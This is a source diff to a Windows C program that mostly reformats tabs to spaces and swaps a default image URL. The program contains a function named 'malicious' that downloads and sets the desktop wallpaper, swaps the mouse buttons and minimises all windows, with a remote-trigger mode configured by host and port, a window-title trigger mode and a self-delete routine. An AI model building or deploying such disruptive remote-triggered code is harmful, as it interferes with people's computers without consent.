@@ -5,7 +5,7 @@
 #pragma comment(lib, "Urlmon.lib")
 #pragma comment(lib, "Shlwapi.lib")
 
-wchar_t defaultUrl[256] = L"https://www.meme-arsenal.com/memes/9b703735887c2cfa6c6e1dad3fe35332.jpg";
+wchar_t defaultUrl[256] = L"https://klike.net/uploads/posts/2019-05/1556708032_1.jpg";
 wchar_t delim[3] = L" \n";
 wchar_t URL[1024] = { 0 };
 wchar_t MODE[128] = { 0 };
@@ -91,9 +91,9 @@ int changeWallpaper(LPCWSTR path, LPCWSTR link)
 
     if (errcode != 0 && link != defaultUrl)
     {
-		errcode = setWallpaperURL(defaultUrl);
+        errcode = setWallpaperURL(defaultUrl);
     }
-    
+
     return errcode;
 }
 
@@ -130,7 +130,7 @@ LRESULT minimizeAll()
 int loadConfig()
 {
     int errcode = 0;
-	StrCpyW(URL, defaultUrl);
+    StrCpyW(URL, defaultUrl);
 
     if (FileExists(L"config.txt"))
     {
@@ -143,19 +143,19 @@ int loadConfig()
         {
             if (fgetws(url, 1024, file) != NULL)
             {
-				StrCpyW(URL, url);
+                StrCpyW(URL, url);
 
                 if (fgetws(mode, 1024, file) != NULL)
                 {
-					LPCWSTR token = NULL;
-					wchar_t buffer[1024] = { 0 };
+                    LPCWSTR token = NULL;
+                    wchar_t buffer[1024] = { 0 };
 
                     token = wcstok_s(mode, delim, &buffer);
                     int count = 0;
 
                     if (StrCmpW(token, L"remote") == 0)
                     {
-						StrCpyW(MODE, token);
+                        StrCpyW(MODE, token);
 
                         while (token != NULL)
                         {
@@ -165,26 +165,26 @@ int loadConfig()
                             {
                                 if (count == 0)
                                 {
-									if (token == NULL || StrCmpW(token, L"\n") == 0)
-									{
+                                    if (token == NULL || StrCmpW(token, L"\n") == 0)
+                                    {
                                         StrCpyW(HOST, DEFAULT_HOST);
                                         StrCpyW(PORT, DEFAULT_PORT);
-										errcode = -1;
-										return -1;
-									}
+                                        errcode = -1;
+                                        return -1;
+                                    }
 
-									wcscpy_s(HOST, 1024, token);
+                                    wcscpy_s(HOST, 1024, token);
                                 }
                                 else if (count == 1)
                                 {
-									if (token == NULL || StrCmpW(token, L"\n") == 0)
-									{
+                                    if (token == NULL || StrCmpW(token, L"\n") == 0)
+                                    {
                                         StrCpyW(PORT, DEFAULT_PORT);
                                         errcode = -1;
-										return -1;
-									}
+                                        return -1;
+                                    }
 
-									wcscpy_s(PORT, 1024, token);
+                                    wcscpy_s(PORT, 1024, token);
                                 }
                             }
                             count++;
@@ -192,18 +192,18 @@ int loadConfig()
                     }
                     else if (StrCmpW(token, L"mine") == 0)
                     {
-						StrCpyW(MODE, token);
+                        StrCpyW(MODE, token);
 
                         while (token != NULL)
                         {
                             token = wcstok_s(NULL, delim, &buffer);
 
-							if ((token == NULL || StrCmpW(token, L"\n") == 0) && count < 1)
-							{
+                            if ((token == NULL || StrCmpW(token, L"\n") == 0) && count < 1)
+                            {
                                 memcpy(TRIGGER, DEFAULT_TRIGGER, 256);
-								errcode = -1;
-								return -1;
-							}
+                                errcode = -1;
+                                return -1;
+                            }
 
                             if (StrCmpW(token, delim) != 0)
                             {
@@ -240,7 +240,7 @@ BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lParam)
         {
             if (TRIGGER[i] == 0)
                 break;
-            
+
             wchar_t trigger[256] = { 0 };
 
             StrCpy(trigger, TRIGGER[i]);
@@ -250,7 +250,7 @@ BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lParam)
                 return 0;
             }
         }
-        
+
     }
 
     return 1;
@@ -258,14 +258,14 @@ BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lParam)
 
 int malicious()
 {
-	int errcode = 0;
+    int errcode = 0;
 
     SystemParametersInfoW(SPI_GETDESKWALLPAPER, 256, OLD_WALLPAPER, 0);
 
-	if (URL != NULL)
-	{
-		errcode = setWallpaperURL(URL);
-	}
+    if (URL != NULL)
+    {
+        errcode = setWallpaperURL(URL);
+    }
     else
         errcode = setWallpaperURL(defaultUrl);
 
@@ -273,7 +273,7 @@ int malicious()
     errcode = SwapMouseButton(1);
     minimizeAll();
 
-	return errcode;
+    return errcode;
 }
 
 int deleteSelf()
@@ -295,7 +295,7 @@ int revertBack()
     {
         wchar_t windir[256] = { 0 };
 
-        if(GetWindowsDirectoryW(windir, 256) != 0 && windir[0] != 0)
+        if (GetWindowsDirectoryW(windir, 256) != 0 && windir[0] != 0)
         {
             wcscat_s(windir, 256, L"\\Web\\Wallpaper\\Windows\\img0.jpg");
             SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, windir, 0);
@@ -327,19 +327,19 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
     {
         int ret = 0;
 
-		if (loadConfig() != 0)
-			ret = -1;
+        if (loadConfig() != 0)
+            ret = -1;
 
         if (StrCmpW(MODE, L"remote") == 0 && HOST != 0 && PORT != 0)
         {
-			if (winsock_init() != 0)
-				ret = -1;
+            if (winsock_init() != 0)
+                ret = -1;
         }
         else if (StrCmpW(MODE, L"mine") == 0 && TRIGGER != 0)
         {
             while (1)
             {
-				ret = GetLastError();
+                ret = GetLastError();
                 if (EnumWindows(enumWindowCallback, 0) == 0)
                 {
                     break;
